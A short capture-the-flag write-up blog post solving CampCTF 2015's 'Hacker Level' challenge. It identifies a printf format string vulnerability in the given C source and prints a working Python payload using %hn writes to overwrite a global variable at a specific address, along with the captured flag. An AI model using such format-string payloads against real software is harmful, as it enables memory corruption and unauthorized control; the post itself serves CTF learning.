---
layout: post
title: "CampCTF 2015 Hacker Level"
date: 2015-08-19 20:57:39 -0400
author: [barrebas]
comments: true
categories: [campctf]
---

### Solved by barrebas

Easy 200 points. We're given a binary and the source. We need to supply a name that will be processed into an integer. The resulting integer should be `0xCCC31337`. If you look at the function:

```c
static uint32_t level = 0;

...

static void calc_level(const char *name) {
    for (const char *p = name; *p; p++) {
        level *= 257;
        level ^= *p;
    }
    level %= 0xcafe;
}
```

Finally, the value for `level` is modulo'd with `0xcafe`. This means that `level` can *never* be the required value `0xCCC31337`. We'll need to co-opt another section of code to pass the check. This quickly came to mind:

```c
    printf("What's your name? ");
    fgets(name, sizeof name, stdin);

    calc_level(name);

    usleep(150000);
    printf("Hello, ");
    printf(name);
```

Excellent. We have a format string vulnerability. After hex-editing the binary to get rid of the `usleep()` calls, I bruteforced the location of our format string on the stack (starts at position 7). Next, the disassembly of `hacker-level` shows us where `level` is at in memory:


```
 8048620:   cmp    DWORD PTR ds:0x804a04c,0xccc31337
```

All I needed to do was to write the correct format string. I came up with:

```python
import struct
def p(x):
    return struct.pack('<L', x)

payload = ""
payload += p(0x804a04c)
payload += p(0x804a04e)
payload += "%4911c%7$hn%47500c%8$hn"

print payload
```

Running this against the remote binary gave `The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604`. Done!

